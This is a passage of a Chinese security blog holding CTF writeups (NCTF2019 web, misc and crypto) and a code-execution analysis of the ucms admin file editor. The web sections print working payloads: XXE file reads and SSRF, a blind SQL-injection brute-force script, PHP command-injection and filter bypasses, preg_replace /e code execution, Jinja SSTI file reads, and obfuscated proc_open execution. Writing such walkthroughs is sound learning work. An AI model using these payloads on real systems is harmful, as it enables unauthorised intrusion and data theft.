<span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line">        $str=substr($str,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">        $_1++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"cococococo-------------"</span>);</span><br><span class="line">    <span class="keyword">print</span>($_1);  </span><br><span class="line">&#125;</span><br><span class="line">decode($afterbase64);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"dddddd---------------"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后这个的解码结果如下:</p>
<p><img src="/.com//12.png" alt="1575124600991"></p>
<p>然后逆序的看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">95</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">125</span></span><br></pre></td></tr></table></figure>

<p>再chr()转字符,得:flag{easy_encode}</p>
<h2 id="2-2-standard-AES256"><a href="#2-2-standard-AES256" class="headerlink" title="2.2 standard_AES256"></a>2.2 standard_AES256</h2><p>sbox,key和cipher 为已知量</p>
<p>思路:做Sbox的逆S(n-1)映射,走一下exp得flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Sbox = [<span class="string">'********'</span>]</span><br><span class="line">ni_Sbox= [<span class="string">'*********'</span>] </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t=Sbox[x][y]</span><br><span class="line">        n = t%<span class="number">16</span></span><br><span class="line">        m = t//<span class="number">16</span></span><br><span class="line">        ni_Sbox[m][n]=x*<span class="number">16</span>+y</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        print(ni_Sbox[x][y],k=<span class="string">","</span>)</span><br></pre></td></tr></table></figure>

<p>解出来的ni_Sbox作为aes256的__InvSbox的table再走一遍,得到flag,脚本网上找….</p>
<p>flag{sbox_to_invsbox}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/03/%E5%AE%89%E8%AF%A22019-%E9%83%A8%E5%88%86crypto-misc/" data-id="ck8sqr5kc001jkou59t61334y" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-ucms后台代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/02/ucms%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2019-12-02T02:43:24.000Z" itemprop="datePublished">2019-12-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/02/ucms%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">ucms后台代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ucms的一个后台漏洞,虽然比较鸡肋….但是好久没有练习代码审计了…找个简单的练练手</p>
<p>ucms&lt;1.4.7</p>
<p>php5.6</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><img src="/.com//1.png" alt="1576291680142"></p>
<p>随便找一个文件进行编辑</p>
<p><img src="/.com//2.png" alt="1576291802970"></p>
<p>保存,然后burp抓包</p>
<p><img src="/.com//3.png" alt="1576291828266"></p>
<p>访问phpinfo.php</p>
<p><img src="/.com//4.png" alt="1576291902126"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>文件修改这个路由:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/ucms146/ucms/index.php?do=sadmin_fileedit&amp;dir=/ucms146/&amp;file=index.php</span></span><br></pre></td></tr></table></figure>

<p>在index.php中可以找到</p>
<p><img src="/.com//5.png" alt="1576292237935"></p>
<p>所以我们跟踪到<strong>./sadmin/fileedit.php</strong></p>
<p>根据上面的路由,找到$file的写入点</p>
<p><img src="/.com//6.png" alt="1576292474149"></p>
<p>主要在于:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fp = @fopen($alldir.$filename,<span class="string">"w"</span>);</span><br></pre></td></tr></table></figure>

<p>未有任何过滤和保护……</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/02/ucms%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5ka001gkou52ki8fqpw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-NCTF2019-Misc-web" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/29/NCTF2019-Misc-web/" class="article-date">
  <time datetime="2019-11-29T14:18:01.000Z" itemprop="datePublished">2019-11-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/29/NCTF2019-Misc-web/">NCTF2019[Misc&amp;&amp;web]</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>NCTF2019…..</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-Fake-XML-cookbook"><a href="#1-Fake-XML-cookbook" class="headerlink" title="1.Fake XML cookbook"></a>1.Fake XML cookbook</h2><p>用户名字段存在有回显xxe，payload直接打，flag在根目录下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY test SYSTEM <span class="string">"file:///flag"</span>&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;<span class="number">123</span>&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//1.png" alt="1574535490793"></p>
<h2 id="2-True-XML-cookbook"><a href="#2-True-XML-cookbook" class="headerlink" title="2.True XML cookbook"></a>2.True XML cookbook</h2><p>再把上一题的payload打一遍，发现已经不行了，但是依旧有回显．</p>
<p><img src="/.com//2.png" alt="1574535803233"></p>
<p>没有找到flag的位置…..试着读源码，发现啥也都没有</p>
<p>最后发现是使用xxe用ssrf打内网,这里有几个文件会记录内网下的ip</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts，/proc/net/arp，/proc/net/fib_trie</span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="1574536023673"></p>
<p>一个个试，在192.168.1.8获得flag</p>
<p><img src="/.com//4.png" alt="1574536099610"></p>
<h2 id="3-sqli"><a href="#3-sqli" class="headerlink" title="3.sqli"></a>3.sqli</h2><p>fuzz测试下发现被ban掉的字符有：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">, <span class="string">' " and or # - + = 空格</span></span><br></pre></td></tr></table></figure>



<p>这里的sql注入的查询语句是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from username=<span class="string">''</span> <span class="keyword">and</span> password=<span class="string">''</span></span><br></pre></td></tr></table></figure>



<p>过滤掉单引号，用反转义来闭合，但是又过滤了所有的注释符，考虑使用%00来截断末尾的单引号</p>
<p>payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">123</span>\&amp;passwd=||<span class="number">1</span>;%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//5.png" alt="1574536786575"></p>
<p>302至welcome.php，所以现在是登录失败和登录成功的差别了，要盲注．</p>
<p>fuzz测试发现，过滤了substr(),mid(),select()</p>
<p>截取字符串的还有right()和left()，但是逗号被过滤了，剩下一个ascii()可以利用，然后=&lt;&gt;like被过滤了，剩下regexp可以利用，而且既然过滤了select ,只能构造简单判断字段的语句．</p>
<p>payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">123</span>\&amp;passwd=||<span class="number">1</span>;%<span class="number">00</span></span><br></pre></td></tr></table></figure>



<p><img src="/.com//31.png" alt="1574604135406"></p>
<p>其中69=’i’.encode(‘hex’)</p>
<p>其中6e=’n’.encode(‘hex’)</p>
<p>其中63=’c’.encode(‘hex’)</p>
<p>先通过ascii手动爆破出第一位</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">123</span>\&amp;passwd=||passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span><span class="number">121</span>;%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>发现是y</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://nctf2019.x1ct34m.com:40005/index.php"</span></span><br><span class="line">string= <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_"</span></span><br><span class="line">password=<span class="string">"y"</span></span><br><span class="line">hex_password=<span class="string">"0x79"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        s = j.encode(<span class="string">'hex'</span>)</span><br><span class="line">        payload  = <span class="string">"/**/||passwd/**/regexp/**/"</span>+hex_password+s+<span class="string">";"</span>+chr(<span class="number">0</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">           <span class="string">"username"</span>:<span class="string">"123\\"</span>,</span><br><span class="line">           <span class="string">"passwd"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"try to make"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password+j</span><br><span class="line">            hex_password= hex_password+s</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//6.png" alt="1574539118753"></p>
<p>爆出密码：you_will_never_know7788990</p>
<p>登陆任意用户名即可获得flag</p>
<h2 id="4-easyphp"><a href="#4-easyphp" class="headerlink" title="4.easyphp"></a>4.easyphp</h2><p>代码审计题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>]; </span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>]; </span><br><span class="line">$cmd = $_GET[<span class="string">'q_w_q'</span>]; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1st </span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd </span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123; </span><br><span class="line">    $md5_1 = md5($string_1); </span><br><span class="line">    $md5_2 = md5($string_2); </span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123; </span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>); </span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>); </span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3rd </span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>]; </span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123; </span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd); </span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123; </span><br><span class="line">            system($cmd); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="number">23333333</span></span><br></pre></td></tr></table></figure>

<p>第一部分：用%0a绕过preg_match()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?num=<span class="number">23333</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>



<p>第二部分：</p>
<p>首先$md5_1不等于$md5_2,这里可以看到$string_1是需要经过is_numeric()的检测</p>
<p>然后$a=$b过第二层，这里考虑使用到0e的特点．</p>
<p>所以最终的思路是，爆破一个数字，他的md5值其中除数字外只包含’cxhp’的其中一个或多个．这样在经过strtr()替换后，$a就是纯数字，再找一个符合0e特点的数字</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9999999</span>):</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    j = md5(str(i))</span><br><span class="line">    <span class="keyword">print</span> j + <span class="string">"   "</span>+str(i)</span><br><span class="line">    <span class="keyword">if</span> j[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> j[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> z <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"0123456789c"</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"------------------md5("</span>+str(i)+<span class="string">")="</span>+j</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>爆破结果：2120624</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=<span class="number">23333</span>%<span class="number">0</span>a&amp;str1=<span class="number">2120624</span>&amp;str2=<span class="number">240610708</span></span><br></pre></td></tr></table></figure>



<p>第三层：</p>
<p><code>$_GET[&#39;q_w_q&#39;]</code>长度小于等于8，并且<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>检测不能包含下划线_</p>
<p>也就是说我们不能输入<code>q_w_q</code>,</p>
<p>参考：<a href="https://zhidao.baidu.com/question/2140448796534468708.html?qq-pf-to=pcqq.c2c" target="_blank" rel="noopener">https://zhidao.baidu.com/question/2140448796534468708.html?qq-pf-to=pcqq.c2c</a></p>
<p>php传入变量带有点号.会被自动转化成下划线_</p>
<p>payload1:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">23333</span>%<span class="number">0</span>a&amp;str1=<span class="number">2120624</span>&amp;str2=<span class="number">240610708</span>&amp;q.w.q=dir%<span class="number">20.</span>/</span><br></pre></td></tr></table></figure>

<p>读目录</p>
<p><img src="/.com//7.png" alt="1574541392345"></p>
<p>考虑到这个参数值长度不可超过８，没有cat,使用head,并且使用通配符绕过对长度的限制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">23333</span>%<span class="number">0</span>a&amp;str1=<span class="number">2120624</span>&amp;str2=<span class="number">240610708</span>&amp;q.w.q=head%<span class="number">20</span>f*</span><br></pre></td></tr></table></figure>

<p><img src="/.com//8.png" alt="1574541534605"></p>
<h2 id="5-replace"><a href="#5-replace" class="headerlink" title="5.replace"></a>5.replace</h2><p>hint:使用php5.6+bootstrap进行开发</p>
<p>参考：<a href="https://www.freebuf.com/column/182130.html" target="_blank" rel="noopener"><a href="https://www.freebuf.com/column/182130.html" target="_blank" rel="noopener">https://www.freebuf.com/column/182130.html</a></a></p>
<p><img src="/.com//9.png" alt="1574541903202"></p>
<p>因为在源码中直接带有/e模式，所以phpinfo()就直接执行了…</p>
<p>过滤了单引号，用chr()代替</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=<span class="number">123</span>&amp;pat=<span class="number">123</span>&amp;rep=show_source(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">108</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>));</span><br></pre></td></tr></table></figure>



<h2 id="6-flask"><a href="#6-flask" class="headerlink" title="6.flask"></a>6.flask</h2><p>打开靶机，是flask写的实现加密功能的网站</p>
<p>在md5加密和base64加密的参数中尝试ssti失败</p>
<p>访问sha256</p>
<p><img src="/.com//10.png" alt="1574542449015"></p>
<p>访问/123</p>
<p><img src="/.com//11.png" alt="1574542483885"></p>
<p>在这里有ssti</p>
<p>然后就直接一把梭读flag,payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'/fla'</span>+<span class="string">'g'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//12.png" alt="1574542639098"></p>
<h2 id="7-hackerbackdoor"><a href="#7-hackerbackdoor" class="headerlink" title="7.hackerbackdoor"></a>7.hackerbackdoor</h2><p>nctf PHP1.0的变形，加上过滤了eval，assert函数</p>
<p>执行phpinfo：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=p.h.p.i.n.f.o;$a();</span><br></pre></td></tr></table></figure>



<p><img src="/.com//13.png" alt="1574542855552"></p>
<p>跟inctf一样，没有禁用proc_open函数，直接按之前的做法，执行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open(<span class="string">"/readFlag&gt;/tmp/hhx"</span>,<span class="keyword">array</span>(),$z);</span><br></pre></td></tr></table></figure>



<p>直接之前的payload来打就行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=p.r.o.c.(%a0^%ff).o.p.e.n;$a((%d0^%ff).r.e.a.d.f.l.a.g.(%c1^%ff).(%d0^%ff).t.m.p.%<span class="number">20</span>(%d0^%ff).c.o.o.k.i.e,<span class="keyword">array</span>(),$z);</span><br></pre></td></tr></table></figure>

<p>写flag到/tmp/cookie</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%<span class="number">27</span>/tmp/cookie%<span class="number">27</span>);&amp;%ff=show_source</span><br></pre></td></tr></table></figure>

<p>读/tmp/cookie</p>
<p>NCTF{u_arrree_S0_c3refu1_aaaaaaa}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="1-a-good-idea"><a href="#1-a-good-idea" class="headerlink" title="1.a_good_idea"></a>1.a_good_idea</h2><p>解压文件得到两个图片</p>
<p>然后用stegsolve用to_do.png去combine那个to.png</p>
<p><img src="/.com//14.png" alt="img"></p>
<h2 id="2-pip-install"><a href="#2-pip-install" class="headerlink" title="2.pip install"></a>2.pip install</h2><p>去安装这个库的时候，安装信息里有一个下载地址</p>
<p>访问该地址，下载库文件，在setup.py里找到flag</p>
<p><img src="/.com//15.png" alt="img"></p>
<p><img src="/.com//16.png" alt="img"></p>
<h2 id="3-What’s-this"><a href="#3-What’s-this" class="headerlink" title="3.What’s this"></a>3.What’s this</h2><p>看着是一道流量分析题……</p>
<p>上传的是一个zip文件，我们保存这个zip文件</p>
<p>然后在deepin上看zip文件是有加密……我在win7上用7z莫名其妙就打开了</p>
<p><img src="/.com//17.png" alt="img"></p>
<p>然后这是一个base64隐写</p>
<p><img src="/.com//18.png" alt="img"></p>
<p>网上找个脚本跑一下</p>
<p><a href="https://www.jianshu.com/p/48fe4dd3e5ce" target="_blank" rel="noopener">https://www.jianshu.com/p/48fe4dd3e5ce</a></p>
<p><img src="/.com//19.png" alt="img"></p>
<h2 id="4-小狗的秘密"><a href="#4-小狗的秘密" class="headerlink" title="4.小狗的秘密"></a>4.小狗的秘密</h2><p>感觉都做到最后一步了，分析流量，http的数据没有逻辑可言，但是在里面发现了一个1.html</p>
<p><img src="/.com//20.png" alt="img"></p>
<p>这是像素坐标，把这个转成png就好了…..</p>
<p>参考：<a href="https://github.com/ctfs/write-ups-2014/tree/master/defkthon-ctf/misc-200" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014/tree/master/defkthon-ctf/misc-200</a></p>
<p>网上找了个脚本，当然用GIMP也是可以的</p>
<p><a href="https://blog.csdn.net/qq_40657585/article/details/84858709" target="_blank" rel="noopener">https://blog.csdn.net/qq_40657585/article/details/84858709</a></p>
<p><img src="/.com//21.png" alt="img"></p>
<p>1.html保存下来的像素点有49799个，保险起见，补一个像素点255 255 255</p>
<p><img src="/.com//22.png" alt="img"></p>
<p>分解49800，最正常的因子有332*150,然后脚本跑一下，就有flag图了．</p>
<p>分解因子的链接：<a href="http://www.ecjson.com/quality/" target="_blank" rel="noopener">http://www.ecjson.com/quality/</a></p>
<p><img src="/.com//23.png" alt="img"></p>
<h2 id="5-键盘侠"><a href="#5-键盘侠" class="headerlink" title="5.键盘侠"></a>5.键盘侠</h2><p>JPG图片后有个压缩包，分离出来，更改后缀.docx。</p>
<p><img src="/.com//26.png" alt="img"></p>
<p>检查文档可以获得一串字符：</p>
<p><img src="/.com//25.png" alt="img"></p>
<p>PD4<del>idqQC|WjHloX&gt;)UPb8</del>ZFb8laGczAeteE</p>
<p>试了一下午，发现原来是base85．．．</p>
<p><img src="/.com//24.png" alt="img"></p>
<h2 id="6-Become-a-Rockstart"><a href="#6-Become-a-Rockstart" class="headerlink" title="6.Become a Rockstart"></a>6.Become a Rockstart</h2><p>很无聊的脑洞题…..</p>
<p><img src="/.com//30.png" alt="img"></p>
<p>我倒着读，然后把这里面提到的几个人说的话拼起来</p>
<p>居然就是flag….</p>
<p>flag:NCTF{youarnicerockstar}</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="1-Keyboard"><a href="#1-Keyboard" class="headerlink" title="1.Keyboard"></a>1.Keyboard</h2><p><img src="/.com//27.png" alt="img"></p>
<p>考虑到这里的ooo　yyy　这些可能是某个字符，然后这样的字符串很像词频攻击</p>
